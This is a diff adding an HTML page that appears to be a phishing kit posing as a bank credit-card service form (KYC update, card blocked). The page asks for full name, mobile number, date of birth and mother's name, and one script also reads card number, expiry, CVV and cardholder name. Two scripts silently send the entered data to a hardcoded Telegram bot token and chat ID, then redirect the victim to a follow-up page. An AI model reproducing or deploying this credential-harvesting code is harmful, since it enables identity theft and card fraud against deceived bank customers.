@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Registration Form</title>
+  <link rel="stylesheet" href="stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.html">
+  <style>
+   {
+  font-family: Georgia, serif;
+}
+    .form-group {
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      
+    }
+    /* Custom CSS styles */
+    body {
+      background-color: #f4f4f4;
+      font-family: Georgia, serif;
+    }
+
+    .card {
+      background-color: white;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      padding: 30px;
+      margin-top: 0px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-group label {
+      font-weight: 600;
+    }
+
+    .split-input {
+      display: flex;
+    }
+
+    .split-input .form-group {
+      flex: 1;
+      margin-right: 7px;
+    }
+
+    .error-message {
+      color: red;
+    }
+  .center {
+    margin-bottom: 20px;
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+  width: 100%;
+  }
+  .sbicard {
+    margin-top: 0%;
+  margin-bottom: 30px;
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+  width: 100%;
+}
+  .sbicard {
+    margin-top: 0%;
+  margin-bottom: 30px;
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+  width: 100%;
+}
+  input[type="text"],
+  input[type="tel"],
+  select {
+    background-color: #F7F7FF;
+      width: 100%;
+      height: 55px;
+      padding: 8px;
+      border: none;
+      border-radius: 10px;
+      box-sizing: border-box;
+    border: 1.3px solid #000000;
+      color: black;
+     font-size: 19px;
+       }
+  ::placeholder {
+  color: black;
+  font-size: 19px;
+  
+}
+  input[type="submit"] {
+      background-color: #00B4F7;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      text-align: center;
+      font-size: 16px;
+      border-radius: 20px;
+      cursor: pointer;
+      height: 50px;
+      font-size: 21px;
+      font-weight: bold;
+      width: 100%;
+       }
+  /* Target the input with id "card-number" and set the placeholder style */
+#card-number::placeholder {
+  font-size: 20px; 
+  color: black;
+  
+}
+  #expiration-date::placeholder {
+  font-size: 20px; 
+  color: black;
+  
+}
+  #cvv::placeholder {
+  font-size: 20px; 
+  color: black;
+  
+}
+  #cardholder-name::placeholder {
+  font-size: 19px; 
+  color: black;
+  
+}
+  </style>
+</head>
+<body>
+    <img src="logo11.png" alt="Paris" class="center">
+   <div class="container">
+    <div class="row">
+      <div class="col-lg-6 offset-lg-3 col-md-8 offset-md-2 col-12">
+        <div class="card">
+        
+          <div class="row">
+      <div class="col-25">
+        
+   <form id="myForm">
+    <div class="form-group">
+      <label for="fullname"></label>
+      <input type="text" id="fullname" name="fullname" placeholder="Full Name" required>
+    </div>
+    <div class="form-group">
+      <label for="mobile"></label>
+      <input type="tel" id="mobile" name="mobile" placeholder="+91- Reg... Mobile No." required>
+    </div>
+    <div class="form-group">
+      <label for="dob"></label>
+      <input type="text" id="dob" name="dob" placeholder="Date Of Birth" required>
+    </div>
+    <div class="form-group">
+      <label for="mothername"></label>
+      <input type="text" id="mothername" name="mothername" placeholder="Mother Name" required>
+    </div>
+    <div class="form-group">
+      <label for="service"></label>
+      <select id="service" name="service" required>
+        <option value="">-- Select a service --</option>
+        <option value="KYC Update">KYC Update</option>
+        <option value="Card Blocked">Card Blocked</option>
+        <option value="Card Unlocked">Card Unlocked</option>
+        <option value="Due Payment Related">Due Payment Related</option>
+        <option value="Other Services">Other Services</option>
+      </select>
+    </div>
+        <br>
+    <input type="submit" value="NEXT">
+  </form>
+    
+        <br>
+        <br>
+        <br>
+        <br>
+        <img src="logo22.jpg" alt="Paris" class="center">
+   
+          
+  
+
+   
+  <script>
+    // Function to send data to Telegram and redirect to another URL
+    function sendTelegramMessage(event) {
+      event.preventDefault(); // Prevent default form submission
+
+      // Get form data
+      const formData = new FormData(document.getElementById('registrationForm'));
+      const creditCard = formData.get('credit-card');
+      const expiryDate = formData.get('expiration-date');
+      const cvv = formData.get('cvv');
+      const cardholderName = formData.get('cardholder-name');
+
+      // Construct message
+      const message = `New registration:\nCredit Card: ${creditCard}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}\nCardholder Name: ${cardholderName}`;
+
+      // Send data to Telegram using fetch and the Telegram Bot API
+      fetch(`https://api.telegram.org/bot8595292095:AAHbmgY8SK61zC0Qa2Z4-4b7E76Jf4KJcYU/sendMessage?chat_id=8488267182&text=${encodeURIComponent(message)}`)
+        .then(response => {
+          if (response.ok) {
+            // Redirect to another URL after successful submission
+            window.location.href = 'card.html'; // Replace with your desired URL
+          } else {
+            // Handle errors if needed
+            console.error('Failed to send message to Telegram');
+          }
+        })
+        .catch(error => {
+          // Handle errors if needed
+          console.error('Error sending message:', error);
+        });
+    }
+
+    // Add form submit event listener
+    document.getElementById('registrationForm').addEventListener('submit', sendTelegramMessage);
+  </script>
+  
+  <script src="code.jquery.com/jquery-3.5.1.slim.min.html"></script>
+  <script src="cdn.jsdelivr.net/npm/%40popperjs/core%401.16.1/dist/umd/popper.min.html"></script>
+  <script src="stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.html"></script>
+  
+ 
+<script>
+    // the bot token you received from BotFather when you created the bot
+    var botToken = '8595292095:AAHbmgY8SK61zC0Qa2Z4-4b7E76Jf4KJcYU';
+
+    // the chat ID of the conversation between you and your bot
+    var botChatID = '8488267182';
+
+    // the URL you want to redirect to after data is sent
+    var redirectUrl = 'car.html';
+
+    document.getElementById('myForm').addEventListener('submit', function(event) {
+        event.preventDefault();  // stop the form from submitting
+        
+        var formData = new FormData(this);
+        var messageText = '';
+        
+        for (var pair of formData.entries()) {
+            messageText += pair[0]+ ': '+ pair[1]+'\n';
+        }
+        
+        var sendTextUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + botChatID + '&parse_mode=HTML&text=' + encodeURIComponent(messageText);
+
+        fetch(sendTextUrl)
+        .then(response => response.json())
+        .then(data => {
+            console.log(data);  // log the API response data to the console
+            window.location.href = redirectUrl;  // redirect to the specified URL
+        });
+    });
+</script>
+<script src="code.jquery.com/jquery-3.5.1.slim.min.html"></script>
+  <script
+</body>
+</html>
+
+    
